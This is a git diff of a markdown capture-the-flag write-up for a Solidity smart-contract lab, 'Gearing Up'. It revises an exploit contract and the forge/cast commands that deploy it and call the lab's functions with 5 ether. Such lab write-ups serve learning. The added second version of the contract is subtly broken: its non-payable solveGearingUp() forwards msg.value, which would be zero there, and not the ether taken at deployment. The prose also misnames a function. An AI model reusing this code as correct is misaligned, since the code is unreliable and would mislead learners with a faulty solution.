@@ -258,7 +258,7 @@ Oh yeah, the *address(what)* is to fulfill the 4th requirement, since it compare
 &nbsp;  
 &nbsp;
 ### Finishing Up & Deploying Exploit
-Now that we have our Exploit for every function, we just need to call *GearingUp::completedGearing()* to make the *Setup::isSolved()* returns true and solved the lab, here is our final Exploit with the Ether send on Deployment (constructor payable)
+Now that we have our Exploit for every function, we just need to call *GearingUp::completedGearing()* to make the *Setup::isSolved()* returns true and solved the lab, here is our final Exploit with the Ether send on the attack
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -271,15 +271,15 @@ contract Exploit{
     Setup public setup;
     GearingUp public immutable GU;
 
-    constructor(address _setup) payable{
-        require(msg.value == 5 ether);
+    constructor(address _setup){
         setup = Setup(_setup);
         GU = GearingUp(setup.GU());
     }
 
-    function solveGearingUp() public{
+    function solveGearingUp() public payable{
+        require(msg.value == 5 ether);
         GU.callThis();
-        GU.sendMoneyHere{value: 5 ether}();
+        GU.sendMoneyHere{value: msg.value}();
         GU.sendSomeData("GearNumber1", 687221, 0x1a2b3c4d, address(this));
         GU.withdrawReward();
         GU.completedGearingUp();
@@ -293,14 +293,56 @@ contract Exploit{
 To Deploy the Exploit, we can use this command below on the root of your project folder
 
 ```bash
-forge create src/gearing-up/Exploit.sol:Exploit -r $RPC_URL --private-key $PK --constructor-args $SETUP_ADDR --value 5ether
+forge create src/gearing-up/Exploit.sol:Exploit -r $RPC_URL --private-key $PK --constructor-args $SETUP_ADDR 
 ```
 &nbsp;  
-you can adjust the command to you needs, by doing this, we are deploying our contract to the network. You will see *Deployer*, *Deployed To*, and *Transaction Hash*, your contract is now deployed with an address of *Deployed To*. To finish up and solve the Lab, let's call our *solveGearingUp()*
+you can adjust the command to you needs, by doing this, we are deploying our contract to the network. You will see *Deployer*, *Deployed to*, and *Transaction Hash*, your contract is now deployed with an address of *Deployed To*. To finish up and solve the Lab, let's call our *solveGearingUp()*
 
 ```bash
-cast send -r $RPC_URL --private-key $PK $EXPLOIT_ADDR "solveGearingUp()"
+cast send -r $RPC_URL --private-key $PK $EXPLOIT_ADDR "solveGearingUp()" --value 5ether
+```
+
+Here is another version of the Exploit contract, this one will require you to include the Ether on the Deployment instead when calling them like the last version of Contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+import "./Setup.sol";
+import "./GearingUp.sol";
+
+contract Exploit{
+    Setup public setup;
+    GearingUp public immutable GU;
+
+    constructor(address _setup) payable {
+        require(msg.value == 5 ether);
+        setup = Setup(_setup);
+        GU = GearingUp(setup.GU());
+    }
+
+    function solveGearingUp() public {
+        GU.callThis();
+        GU.sendMoneyHere{value: msg.value}();
+        GU.sendSomeData("GearNumber1", 687221, 0x1a2b3c4d, address(this));
+        GU.withdrawReward();
+        GU.completedGearingUp();
+    }
+
+    receive() external payable { }
+
+}
 ```
 &nbsp;  
+To deploy this version of contract we need to adjust our command to be like this one below
+
+```bash
+// Deploying the Exploit
+forge create src/gearing-up/Exploit.sol:Exploit -r $RPC_URL --private-key $PK --constructor-args $SETUP_ADDR --value 5ether
+
+// Calling the solveGearingUp function
+cast send -r $RPC_URL --private-key $PK $EXPLOIT_ADDR "solveGearingUp()" 
+```
+
 And Congratulations! You just Solved Gearing Up and Ready to begin the Real HEIST!
 
